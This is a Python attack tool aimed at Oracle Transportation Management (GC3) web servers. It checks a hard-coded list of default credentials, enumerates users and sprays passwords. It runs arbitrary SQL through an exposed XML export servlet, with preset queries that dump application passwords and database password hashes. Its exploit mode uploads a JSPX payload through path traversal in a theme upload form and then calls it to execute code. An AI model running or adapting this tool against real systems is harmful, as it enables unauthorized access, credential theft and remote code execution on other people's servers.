import requests
import sys
import urllib3
import argparse
import re
import html
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def myArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('attktype',help='Attack method ( default, enum, spray, quary, exploit)')
    parser.add_argument('hosts_file',help='List of target URLs')
    parser.add_argument('-u','--users_file',help='List of user names to target')
    parser.add_argument('-su','--sprayuser', help='User name to test')
    parser.add_argument('-q','--query', help='SQL query to run')
    parser.add_argument('-uq','--userquery', help='User to query the SQL')
    parser.add_argument('-pq', '--passquery', help='Password to query the SQL')
    parser.add_argument('-lu','--loginuser', help='User to login')
    parser.add_argument('-lp', '--loginpassword', help='Password to login')
    parser.add_argument('-pf', '--payloadfile', help='Payload file to upload')
    return parser.parse_args()


args = myArguments()

attktype = args.attktype
hosts_file = args.hosts_file
users_file = args.users_file
sprayuser = args.sprayuser
query = args.query
userquery = args.userquery
passquery = args.passquery
loginuser = args.loginuser
loginpassword = args.loginpassword
payloadfile = args.payloadfile


def send_req(url, user, passw):
    scheme = url.split("/")[0]
    hostname = url.split("/")[2]
    if ":" in hostname:
        hostheader = hostname.split(":")[0]
    else:
        hostheader=hostname
    #print('[*] Using '+hostname+' host and '+user+':'+passw+' credentials')
    url = scheme+'//'+hostname+'/GC3/glog.integration.servlet.DBXMLServlet?command=xmlExport'
    headers = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101",
               "Content-Type": "text/xml",
               "Accept": "application/xml, text/xml, */*; q=0.01",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               'UserName': user,
               'Password': passw
               }
    xml ='<sql2xml><Query><RootName>user_association</RootName><Statement>select 123123123 from dual  </Statement></Query><FootPrint>N</FootPrint><UseLOBElement>N</UseLOBElement></sql2xml>'
    r = requests.post(url, data = xml, headers=headers, verify=False ,timeout=30)

    notexist = f'User {user} not found'
    autherror = "Authentication Failed for user"
    success = "123123123"

    if notexist in r.text:
        print("[-] User does not exists")
        a=1
    elif autherror in r.text:
        print("[-] Authentication failed for user "+user)
        a=1
    elif success in r.text:
        print("[+] Authentication succeeded for user: "+user+ "(host:"+hostname+")")
        return True
    else:
        print("[!] ERROR WHEN ACCESSING USING "+user+" user")
        print(r.text)
        a=1


def check_default(url):
    print("---- Working on "+url+" host ----")
    defaultusers = ["DBA.ADMIN:CHANGEME","DBA.DEFAULT:CHANGEME","SERVPROV.ADMIN:CHANGEME","SERVPROV.DEFAULT:CHANGEME","GUEST.ADMIN:CHANGEME","GUEST.DEFAULT:CHANGEME","GLOG.ADMIN:CHANGEME","GLOG.DEFAULT:CHANGEME","STAGE.ADMIN:CHANGEME","STAGE.DEFAULT:CHANGEME","EBS.ADMIN:CHANGEME","EBS.DEFAULT:CHANGEME","E1.ADMIN:CHANGEME","E1.DEFAULT:CHANGEME","BLUEPRINT.ADMIN:CHANGEME","BLUEPRINT.DEFAULT:CHANGEME","system:CHANGEME","guest:CHANGEME","ebs:ebs","e1:e1","blueprint:blueprint","glog:glog","glogdev:CHANGEME"]
    resultsarray = []
    for user in defaultusers:
        currentuser = user.split(":")[0]
        currentpass = user.split(":")[1]
        if send_req(url, currentuser, currentpass)==True:
            resultsarray.append(currentuser)
    print(resultsarray)


def enum_user(url,enum_file):
    enumfile = open(enum_file, 'r')
    users = enumfile.read().splitlines()

    for user in users:
        send_req(url,user,'fakepass')


def spray(url,user,enum_file):
    print(enum_file)
    enumfile = open(enum_file, 'r')
    passwords = enumfile.read().splitlines()

    for passw in passwords:
        send_req(url,user,passw)

def send_query(url, user, passw,query):
    scheme = url.split("/")[0]
    hostname = url.split("/")[2]
    if ":" in hostname:
        hostheader = hostname.split(":")[0]
    else:
        hostheader=hostname
    print('[*] Using '+hostname+' host and '+user+':'+passw+' credentials')
    url = scheme+'//'+hostname+'/GC3/glog.integration.servlet.DBXMLServlet?command=xmlExport'
    headers = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
               "Content-Type": "text/xml",
               "Accept": "application/xml, text/xml, */*; q=0.01",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               'UserName': user,
               'Password': passw
               }
    xml ='<sql2xml><Query><RootName>user_association</RootName><Statement>'+query+'</Statement></Query><FootPrint>N</FootPrint><UseLOBElement>N</UseLOBElement></sql2xml>'
    r = requests.post(url, data = xml, headers=headers, verify=False)
    print(r.text)

def dologin(url, user, passw):
    scheme = url.split("/")[0]
    hostname = url.split("/")[2]
    if ":" in hostname:
        hostheader = hostname.split(":")[0]
    else:
        hostheader=hostname
    print('[*] Using '+hostname+' host and '+user+':'+passw+' credentials')
    print('[*] Authenticating to '+hostname+' server')
    url = scheme+'//'+hostname+'/GC3/glog.webserver.servlet.umt.Login'
    headers = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
               "Content-Type": "application/x-www-form-urlencoded",
               "Accept": "application/xml, text/xml, */*; q=0.01",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5"
               }
    data ='redir=%2FGC3%2Fglog.webserver.util.FrameGC3Servlet&username='+user+'&userpassword='+passw+'&namespace=GC3&submitbutton=Login&bcKey=&ct='
    r = requests.post(url, data = data, headers=headers, allow_redirects=False, verify=False)
    if r.status_code == 302:
        print('[+] Login succeeded, extracting JSESSIONID cookie...')
        cookie = r.headers['Set-Cookie']
        cookie = cookie.split("; ")
        cookie = cookie[0]
        print('[*] Using '+cookie+' for session')
        exploitparam(url, cookie)
    else:
        print('[-] Authentication failed for user '+user+'...')



def exploitparam(url, cookie):
    scheme = url.split("/")[0]
    hostname = url.split("/")[2]
    if ":" in hostname:
        hostheader = hostname.split(":")[0]
    else:
        hostheader=hostname
    print('[*] Getting upload link variables from themes page ('+hostname+' host)')
    url = scheme+'//'+hostname+'/GC3/glog.webserver.branding.thememanagement.ThemeManagementServlet'
    headers = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
               "Content-Type": "application/x-www-form-urlencoded",
               "Accept": "application/xml, text/xml, */*; q=0.01",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               'Cookie': cookie
               }
    r = requests.get(url, headers=headers, verify=False)
    glogServlet = re.findall(r"var glogServlet.+?(?=;)", r.text)
    breadCrumbsKey = re.findall(r"var breadCrumbsKey.+?(?=;)", r.text)
    ct = re.findall(r"var ct.+?(?=;)", r.text)
    ct = ct[0].split("'")
    ct = str(ct[1].encode('ascii', 'ignore'))
    glogServlet = glogServlet[0].split("'")
    glogServlet = str(glogServlet[1].encode('ascii', 'ignore'))
    breadCrumbsKey = breadCrumbsKey[0].split("'")
    breadCrumbsKey = str(breadCrumbsKey[1].encode('ascii', 'ignore'))
    print('[*] The following upload link variables extracted '+glogServlet+' ,'+breadCrumbsKey+' ,'+ct+' proceeding attack...')
    exploitupload(url, cookie,ct,glogServlet,breadCrumbsKey,payloadfile)


def exploitupload(url, cookie, ct, glog,bckey,payload):
    with open(payload, 'r') as file:
        payloadcontent = file.read().replace('\n', '')
    scheme = url.split("/")[0]
    hostname = url.split("/")[2]
    if ":" in hostname:
        hostheader = hostname.split(":")[0]
    else:
        hostheader=hostname

    print('[*] Extracting traversal path from server properties...')
    propetiesurl = scheme+'//'+hostname+'/GC3/glog.webserver.properties.PropertiesServlet/1621020178354?ct='+ct+'&bcKey='+bckey+'&frame=List'
    propertiesheaders = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,im"
                               "age/webp,*/*;q=0.8",
                     "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                     "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0",'Cookie': cookie}
    properties = requests.get(propetiesurl, headers=propertiesheaders)
    jspdir = re.findall(r"glog\.custscreens\.jspLocation\=.+?(?=jsp)", properties.text)
    jspdir = jspdir[0].split("$")
    jspdir = jspdir[2]
    jspdir = jspdir.replace('/', '\\')
    jspdir = jspdir+"jsp"
    print('[*] Found injection directory ('+jspdir+')')

    print('[*] Uploading payload to the server... ('+hostname+' host)')
    url = scheme+'//'+hostname+'/GC3/glog.webserver.branding.thememanagement.ThemeManagementServlet/'+glog+'?ct='+ct+'&bcKey='+bckey+'&id=update'
    headers = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
               "Content-Type": "multipart/form-data; boundary=---------------------------176439097340826088612669123687",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "Content-Length": "4821",
               "Origin ": url,
               "Referer": "http://winserver:7777/GC3/glog.webserver.branding.thememanagement.ThemeManagementServlet/"+glog+"?ct="+ct+"&bcKey="+bckey+"&id=set",
               'Cookie': cookie
               }
    data = "-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"theme_name\"\r\n\r\n\..\..\..\..\.."+jspdir+"\Shipment\SHIPMENT\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"is_new_theme\"\r\n\r\ntrue\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"hidden/uniqueID\"\r\n\r\n5509020834300\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_Default\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"Default\"\r\n\r\n4\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"set_as_global\"\r\n\r\nfalse\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"carryover_settings\"\r\n\r\nfalse\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_file/branding_logo_img\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"file/branding_logo_img\"; filename=\"Exploit.jspx\"\r\nContent-Type: application/octet-stream\r\n\r\n  \r\n"+payloadcontent+"\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_file/home_img\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"file/home_img\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_file/login_img\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"file/login_img\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_text/branding_url\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"text/branding_url\"\r\n\r\nhttp://www.oracle.com\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"translation/branding_title\"\r\n\r\nlabel.LOGISTICS\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"is_picklist_translation/branding_title\"\r\n\r\njoe\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"picklist_allows_vars_translation/branding_title\"\r\n\r\nfalse\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"allow_asterisk_translation/branding_title\"\r\n\r\nfalse\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"dont_validate_translation/branding_title\"\r\n\r\ntrue\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"translation/branding_title@ID\"\r\n\r\nlabel.LOGISTICS\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"query_translation/branding_title\"\r\n\r\nglog.server.query.translation.TranslationQuery\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"management_translation/branding_title\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"listRetriever_translation/branding_title\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"dataSourceContext_translation/branding_title\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"label_translation/branding_title\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_file/mobile_oraclebanner_img\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"file/mobile_oraclebanner_img\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"default_grid_value_file/mobile_otm_img\"\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"file/mobile_otm_img\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"bcKey\"\r\n\r\n"+bckey+"\r\n-----------------------------176439097340826088612669123687\r\nContent-Disposition: form-data; name=\"ct\"\r\n\r\n"+ct+"\r\n-----------------------------176439097340826088612669123687--\r\n"
    requests.post(url, headers=headers, data=data)

    print('[*] Calling the uploaded JSPX for exploit')
    exploiturl = scheme+'//'+hostname+'/GC3/ShipmentCustManagement/'+glog+'?ct='+ct+'&bcKey='+bckey+'&generic_stylesheet=jsp:/jsp/Shipment/SHIPMENT/Exploit.jspx&manager_layout_gid=SHIPMENT'
    exploitheaders = {'Host': hostheader,
               "Connection": "close",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "Referer": url+"/GC3/glog.webserver.finder.FinderServlet?ct="+ct+"&query_name=glog.server.query.shipment.BuyShipmentQuery&finder_set_gid=BUY_SHIPMENT",
               'Cookie': cookie
               }
    exploitreq = requests.get(exploiturl, headers=exploitheaders)
    if exploitreq.status_code == 200:
        print('[+] Exploit completed, congrats!')
    elif exploitreq.status_code == 302:
        print('[-] Something went wrong. Looks like a session issue.')
    elif exploitreq.status_code == 403:
        print('[-] 403 response code returned from the server. Probably something with the file path.')


file = open(hosts_file, 'r')
lines = file.read().splitlines()


if attktype == 'enum':
    print('[*] Running in enum mode...')
    for line in lines:
        enum_user(line,users_file)

if attktype == 'default':
    print('[*] Running in default mode...')
    for line in lines:
        check_default(line)

if attktype == 'spray':
    print('[*] Running in spray mode...')
    for line in lines:
        spray(line,sprayuser,users_file)

if attktype == 'exploit':
    print('[*] Running in exploit mode...')
    for line in lines:
        dologin(line,loginuser,loginpassword)

if attktype == 'query':
    print('[*] Running in query mode...')
    if query == 'os':
        query = 'SELECT dbms_utility.port_string FROM DUAL'
    elif query == 'osuser':
        query = 'SELECT SYS_CONTEXT(\'USERENV\',\'OS_USER\') FROM dual'
    elif query == 'hostname':
        query = 'SELECT SYS_CONTEXT(\'USERENV\',\'SERVER_HOST\') FROM dual'
    elif query == 'hostip':
        query = 'SELECT SYS_CONTEXT(\'USERENV\',\'IP_ADDRESS\') FROM dual'
    elif query == 'passwords':
        query = 'SELECT * FROM GL_USER'
    elif query == 'oraversion':
        query= 'SELECT version FROM v$instance'
    elif query == 'dbusershash':
        query = 'SELECT name,spare4 FROM sys.user$'
    elif query == 'dbfileslocation':
        query = 'SELECT name FROM V$DATAFILE'
    for line in lines:
        send_query(line, userquery, passquery,query)






# to fix:
# - u in spray should be list or string.
#clean the response for query
